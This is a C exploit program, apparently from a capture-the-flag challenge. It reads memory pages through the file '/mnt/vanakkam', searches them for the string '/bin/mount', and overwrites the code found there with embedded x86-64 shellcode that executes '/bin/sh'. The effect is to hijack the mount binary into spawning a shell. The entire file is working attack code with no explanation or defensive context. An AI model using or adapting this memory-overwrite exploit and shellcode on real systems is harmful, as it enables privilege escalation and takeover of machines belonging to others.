#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define PATTERN "/bin/mount"

int search(char *buf, const char *needle)
{
    for (char *s = buf; s < buf + 0x1000; s += strlen(s) + 1) {
        if (!memcmp(s, PATTERN, strlen(PATTERN)))
            return 1;
    }

    return 0;
}

int main(int argc, char *argv[])
{
    int start = atoi(argv[1]);
    int end = atoi(argv[2]);
    int fd = open("/mnt/vanakkam", O_RDWR);
    char buf[0x1000];
    int off = 0;

    puts("[*] leaking memory and find pattern " PATTERN);
    for (int i = start; i < end; i++) {
        lseek(fd, i * 0x1000, SEEK_SET);
        read(fd, buf, 0x1000);
        if (search(buf, PATTERN)) {
            printf("offset = %d\n", i);
            off = i * 0x1000  - 0x94000 + 0x1081;
            break;
        }
    }

    if (off == 0) {
        puts("cannot find pattern ...");
        exit(1);
    }

    char sc[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
    puts("make /mount to execve /bin/sh");
    lseek(fd, off, SEEK_SET);
    write(fd, sc, strlen(sc));

    close(fd);

    return 0;
}
